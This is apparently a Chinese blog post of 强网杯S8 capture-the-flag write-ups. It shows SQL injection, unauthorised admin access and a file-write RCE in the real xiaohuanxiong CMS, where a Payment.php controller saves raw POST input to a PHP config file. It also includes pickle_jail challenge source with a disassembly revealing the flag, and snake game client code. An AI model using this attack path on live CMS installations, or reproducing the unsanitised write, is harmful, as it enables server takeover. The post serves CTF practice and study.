<h1 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a>xiaohuanxiong</h1><p>小涴熊漫画CMS，官方源码已经删库了，连文档都没了，找了个别人fork的库 <a target="_blank" rel="noopener" href="https://github.com/forkable/xiaohuanxiong">https://github.com/forkable/xiaohuanxiong</a></p>
<p>ThinkPHP V5.1.35 LTS</p>
<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102141120778.png" alt="image-20241102141120778"></p>
<p>发现 &#x2F;search?keyword&#x3D; 存在sql注入，但是写不进shell</p>
<p>扫 admin 时发现 admin&#x2F;admins 存在未授权访问</p>
<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102165134312.png" alt="image-20241102165134312"></p>
<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102165342634.png" alt="image-20241102165342634"></p>
<p>审代码发现 admin 里有<code>file_put_contents</code>的部分</p>
<p>application&#x2F;admin&#x2F;controller&#x2F;Payment.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//支付配置文件</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">request</span><span class="token operator">-></span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token class-name static-context">App</span><span class="token operator">::</span><span class="token function">getRootPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'config/payment.php'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">success</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'保存成功'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token class-name static-context">App</span><span class="token operator">::</span><span class="token function">getRootPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'config/payment.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'json'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输入可控，直接rce</p>
<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102165930445.png" alt="image-20241102165930445"></p>
<p>刷新得到flag</p>
<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102165957107.png" alt="image-20241102165957107"></p>
<hr>
<h1 id="misc-pickle-jail（Unsolved）"><a href="#misc-pickle-jail（Unsolved）" class="headerlink" title="misc-pickle_jail（Unsolved）"></a>misc-pickle_jail（Unsolved）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token keyword">from</span> os <span class="token keyword">import</span> _exit
<span class="token keyword">from</span> pathlib <span class="token keyword">import</span> Path
<span class="token keyword">from</span> pickle <span class="token keyword">import</span> Pickler<span class="token punctuation">,</span> Unpickler
<span class="token keyword">from</span> sys <span class="token keyword">import</span> stderr<span class="token punctuation">,</span> stdin<span class="token punctuation">,</span> stdout
<span class="token keyword">from</span> time <span class="token keyword">import</span> time

<span class="token keyword">from</span> faker <span class="token keyword">import</span> Faker

Faker<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
fake <span class="token operator">=</span> Faker<span class="token punctuation">(</span><span class="token string">"en_US"</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> Path<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read_text<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">print</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">:</span>
    stdout<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    stdout<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">input</span><span class="token punctuation">(</span>_<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> limit<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">_</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span>
    _ <span class="token operator">=</span> stdin<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>readline<span class="token punctuation">(</span>limit<span class="token punctuation">)</span>
    stdin<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> _


<span class="token keyword">def</span> <span class="token function">bye</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span>
    _exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


players <span class="token operator">=</span> <span class="token punctuation">[</span>fake<span class="token punctuation">.</span>unique<span class="token punctuation">.</span>first_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to this jail game!"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Play this game to get the flag with these players: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>players<span class="token punctuation">&#125;</span></span><span class="token string">!"</span></span><span class="token punctuation">)</span>
name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"So... What's your name?"</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">assert</span> name <span class="token keyword">not</span> <span class="token keyword">in</span> players<span class="token punctuation">,</span> <span class="token string">"You are already joined!"</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Welcome </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">!"</span></span><span class="token punctuation">)</span>
players<span class="token punctuation">.</span>append<span class="token punctuation">(</span>name<span class="token punctuation">)</span>

biox <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
Pickler<span class="token punctuation">(</span>biox<span class="token punctuation">)</span><span class="token punctuation">.</span>dump<span class="token punctuation">(</span>
    <span class="token punctuation">(</span>
        name<span class="token punctuation">,</span>
        players<span class="token punctuation">,</span>
        flag<span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token punctuation">)</span>

data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>biox<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter a random number to win: "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">assert</span> num <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"You are not allowed to win!"</span>
data<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
data<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">%=</span> <span class="token number">0xFF</span>

<span class="token keyword">del</span> name<span class="token punctuation">,</span> players<span class="token punctuation">,</span> flag
biox<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
stderr<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    safe_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
        <span class="token string">"n"</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">"F"</span><span class="token punctuation">:</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>Unpickler<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"find_class"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> <span class="token operator">*</span><span class="token keyword">_</span><span class="token punctuation">:</span> <span class="token string">"H4cker"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
    name<span class="token punctuation">,</span> players<span class="token punctuation">,</span> _ <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"F(n).load()"</span><span class="token punctuation">,</span> safe_dic<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> name <span class="token keyword">in</span> players<span class="token punctuation">:</span>
        <span class="token keyword">del</span> _
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string"> joined this game, but here is no flag!"</span></span><span class="token punctuation">)</span>
<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"What happened? IDK..."</span></span><span class="token punctuation">)</span>
<span class="token keyword">finally</span><span class="token punctuation">:</span>
    bye<span class="token punctuation">(</span><span class="token string">"Break this jail to get the flag!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>参考：<a target="_blank" rel="noopener" href="https://zenn.dev/tchen/articles/5c446d9dbd9920#%E2%9C%85-lost-in-transit-(1126pts-18%2F715solves-%E3%82%AF%E3%83%AA%E3%82%A2%E7%8E%872.5%25)">https://zenn.dev/tchen/articles/5c446d9dbd9920#%E2%9C%85-lost-in-transit-(1126pts-18%2F715solves-%E3%82%AF%E3%83%AA%E3%82%A2%E7%8E%872.5%25)</a></p>
<p>pickletools 解析一下字节串，对照参考文章</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">    <span class="token number">0</span><span class="token punctuation">:</span> \x80 PROTO      <span class="token number">4</span>
    <span class="token number">2</span><span class="token punctuation">:</span> \x95 FRAME      <span class="token number">554</span>
   <span class="token number">11</span><span class="token punctuation">:</span> C    SHORT_BINBYTES <span class="token string">b'1'</span>
   <span class="token number">14</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">0</span><span class="token punctuation">)</span>
   <span class="token number">15</span><span class="token punctuation">:</span> <span class="token punctuation">]</span>    EMPTY_LIST
   <span class="token number">16</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">1</span><span class="token punctuation">)</span>
   <span class="token number">17</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    MARK
   <span class="token number">18</span><span class="token punctuation">:</span> C        SHORT_BINBYTES <span class="token string">b'David'</span>
   <span class="token number">25</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token number">468</span><span class="token punctuation">:</span> C        SHORT_BINBYTES <span class="token string">b'Gerald'</span>
  <span class="token number">476</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">51</span><span class="token punctuation">)</span>
  <span class="token number">477</span><span class="token punctuation">:</span> h        BINGET     <span class="token number">0</span>
  <span class="token number">479</span><span class="token punctuation">:</span> e        APPENDS    <span class="token punctuation">(</span>MARK at <span class="token number">17</span><span class="token punctuation">)</span>
  <span class="token number">480</span><span class="token punctuation">:</span> \x8c SHORT_BINUNICODE <span class="token string">'jail&#123;they_talk_about_integer_overflow_but_i_dont_think_this_is_what_they_meant&#125;'</span>
  <span class="token number">561</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">52</span><span class="token punctuation">)</span>
  <span class="token number">562</span><span class="token punctuation">:</span> \x87 TUPLE3
  <span class="token number">563</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">53</span><span class="token punctuation">)</span>
  <span class="token number">564</span><span class="token punctuation">:</span> <span class="token punctuation">.</span>    STOP
highest protocol among opcodes <span class="token operator">=</span> <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">    <span class="token number">0</span><span class="token punctuation">:</span> \x80 PROTO      <span class="token number">4</span>
    <span class="token number">2</span><span class="token punctuation">:</span> \x95 FRAME      <span class="token number">87</span>
   <span class="token number">11</span><span class="token punctuation">:</span> K    BININT1    <span class="token number">1</span>
   <span class="token number">13</span><span class="token punctuation">:</span> \x8c SHORT_BINUNICODE <span class="token string">'jail&#123;they_talk_about_integer_overflow_but_i_dont_think_this_is_what_they_meant&#125;'</span>
   <span class="token number">94</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">0</span><span class="token punctuation">)</span>
   <span class="token number">95</span><span class="token punctuation">:</span> \x86 TUPLE2
   <span class="token number">96</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">1</span><span class="token punctuation">)</span>
   <span class="token number">97</span><span class="token punctuation">:</span> <span class="token punctuation">.</span>    STOP
highest protocol among opcodes <span class="token operator">=</span> <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>SHORT_BINUNICODE：</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">　　バイト列の長さ
   --
8C 03 70 6F 67
--    --------
命令    文字列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>。。。看不懂了</p>
<hr>
<h1 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> canvas <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'gameCanvas'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> ctx <span class="token operator">=</span> canvas<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">'2d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> snake <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> food <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> score <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>width<span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 绘制蛇</span>
    ctx<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> <span class="token string">'#00ff00'</span><span class="token punctuation">;</span>
    snake<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">segment</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        ctx<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span>segment<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">,</span> segment<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 绘制食物</span>
    ctx<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> <span class="token string">'#ff0000'</span><span class="token punctuation">;</span>
    ctx<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span>food<span class="token punctuation">.</span>x <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">,</span> food<span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 显示分数</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'score'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Score: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>score<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/move'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">direction</span><span class="token operator">:</span> currentDirection <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">'game_over'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Game Over! Your score: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>data<span class="token punctuation">.</span>score<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">reset_game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">'win'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>data<span class="token punctuation">.</span>url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            snake <span class="token operator">=</span> data<span class="token punctuation">.</span>snake<span class="token punctuation">;</span>
            food <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">x</span><span class="token operator">:</span> data<span class="token punctuation">.</span>food<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> data<span class="token punctuation">.</span>food<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
            score <span class="token operator">=</span> data<span class="token punctuation">.</span>score<span class="token punctuation">;</span>
            <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">let</span> currentDirection <span class="token operator">=</span> <span class="token string">'RIGHT'</span><span class="token punctuation">;</span>

document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'keydown'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token string">'ArrowUp'</span><span class="token operator">:</span>
            currentDirection <span class="token operator">=</span> <span class="token string">'UP'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'ArrowDown'</span><span class="token operator">:</span>
            currentDirection <span class="token operator">=</span> <span class="token string">'DOWN'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'ArrowLeft'</span><span class="token operator">:</span>
            currentDirection <span class="token operator">=</span> <span class="token string">'LEFT'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'ArrowRight'</span><span class="token operator">:</span>
            currentDirection <span class="token operator">=</span> <span class="token string">'RIGHT'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">reset_game</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/move'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">direction</span><span class="token operator">:</span> <span class="token string">'RIGHT'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        snake <span class="token operator">=</span> data<span class="token punctuation">.</span>snake<span class="token punctuation">;</span>
        food <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">x</span><span class="token operator">:</span> data<span class="token punctuation">.</span>food<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> data<span class="token punctuation">.</span>food<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        score <span class="token operator">=</span> data<span class="token punctuation">.</span>score<span class="token punctuation">;</span>
        <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setInterval</span><span class="token punctuation">(</span>update<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 初始化游戏</span>
<span class="token function">reset_game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

